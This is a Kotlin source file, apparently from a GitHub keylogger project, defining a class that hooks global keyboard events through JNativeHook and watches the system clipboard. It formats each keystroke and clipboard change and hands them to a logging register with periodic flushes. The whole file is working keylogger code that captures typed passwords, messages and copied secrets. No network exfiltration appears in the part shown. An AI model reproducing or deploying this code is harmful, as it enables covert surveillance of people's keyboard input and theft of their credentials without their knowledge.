package com.github.secretx33.keylogger

import kotlinx.coroutines.CoroutineName
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import kotlin.system.exitProcess
import kotlin.time.Duration.Companion.milliseconds
import kotlin.time.Duration.Companion.seconds

/**
 * Keylogger is a class that implements `NativeKeyListener` to capture and log key events. It also logs
 * clipboard content changes through a `ClipboardWatcher` instance.
 *
 * @property logFormat an instance of `LogFormat` to format logged key events
 * @property clipboardWatcher an instance of `ClipboardWatcher` to watch and manage clipboard changes
 * @property keyRegister an instance of `KeyRegister` to save and manage logged key events
 * @property lastPressedKeyRawCode holds the raw code of the last pressed key
 */
class Keylogger : NativeKeyListener {

    private val logFormat = LogFormat()
    private val clipboardWatcher = ClipboardWatcher()
    private val keyRegister = KeyRegister(timeBetweenFlushes = 500.milliseconds, appendTimestampAfter = 5.seconds)
    @Volatile
    private var lastPressedKeyRawCode = 0

    /**
     * Hooks the keylogger to the system, setting up a global key listener and a clipboard watcher.
     */
    fun hook() {
        disableAnnoyingJnativehookLogger()
        setupGlobalKeyListener()
        setupClipboardWatcher()
    }

    /**
     * Sets up the global key listener by registering the native hook and adding this instance as a native key listener.
     */
    private fun setupGlobalKeyListener() {
        try {
            GlobalScreen.registerNativeHook()
        } catch (e: NativeHookException) {
            System.err.println("${e.message}: ${e.stackTraceToString()}")
            exitProcess(1)
        }
        GlobalScreen.addNativeKeyListener(this)
    }

    /**
     * Sets up the clipboard watcher by adding a listener that formats and logs clipboard content, and register the
     * clipboard watcher to lister for clipboard changes.
     */
    private fun setupClipboardWatcher() {
        clipboardWatcher.addListener {
            val formattedClipboard = logFormat.formatClipboard(it)
            keyRegister.apply {
                saveKey(formattedClipboard)
                forceNewLine()
            }
        }
        SYSTEM_CLIPBOARD.addFlavorListener(clipboardWatcher)
    }

    /**
     * Called when a keyboard key is pressed.
     *
     * @param event the `NativeKeyEvent` containing information about the key press
     */
    override fun nativeKeyPressed(event: NativeKeyEvent) {
        if (IS_DEBUG_ENABLED) {
            println("event.keyCode = '${event.keyCode}' ('${NativeKeyEvent.getKeyText(event.keyCode)}'), event.keyChar = '${event.keyChar}', event.rawCode = ${event.rawCode}, event.modifiers = ${event.modifiers}, event.isActionKey = ${event.isActionKey}")
        }

        val lastPressedKeyRawCode = lastPressedKeyRawCode
        if (event.keyCode in BLACKLISTED_KEYS  // Blacklisted key
            || lastPressedKeyRawCode == event.rawCode && event.rawCode in DEBOUNCED_KEYS  // Debounced key
        ) return

        this.lastPressedKeyRawCode = event.rawCode

        coroutineScope.launch {
            val keyText = logFormat.formatKey(keyCode = event.keyCode, rawKeyCode = event.rawCode, isShiftPressed = event.hasModifier(NativeKeyEvent.SHIFT_MASK))
            keyRegister.saveKey(keyText)
            if (event.keyCode == NativeKeyEvent.VC_ENTER) {
                keyRegister.forceNewLine()
            }
        }
    }

    override fun nativeKeyTyped(event: NativeKeyEvent) {
    }

    override fun nativeKeyReleased(event: NativeKeyEvent) {
    }

    private companion object {
        /**
         * Keys to debounce (raw codes), that is, do not register consecutive presses of these keys.
         *
         * These are the common command keys such as `Ctrl`, `Alt`, etc
         */
        val DEBOUNCED_KEYS = setOf(13, 27, 58, 91, 93, 144, 160, 161, 162, 163, 164, 165)

        /**
         * Keys that should never be logged.
         */
        val BLACKLISTED_KEYS = setOf(3638, NativeKeyEvent.VC_SHIFT, NativeKeyEvent.VC_ESCAPE, NativeKeyEvent.VC_PAGE_DOWN, NativeKeyEvent.VC_PAGE_UP, NativeKeyEvent.VC_NUM_LOCK, NativeKeyEvent.VC_VOLUME_DOWN, NativeKeyEvent.VC_VOLUME_UP, NativeKeyEvent.VC_VOLUME_MUTE, NativeKeyEvent.VC_MEDIA_PLAY, NativeKeyEvent.VC_PAUSE, NativeKeyEvent.VC_MEDIA_STOP, NativeKeyEvent.VC_MEDIA_NEXT, NativeKeyEvent.VC_MEDIA_PREVIOUS, NativeKeyEvent.VC_MEDIA_EJECT)
    }
}

val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + CoroutineName(Keylogger::class.java.simpleName))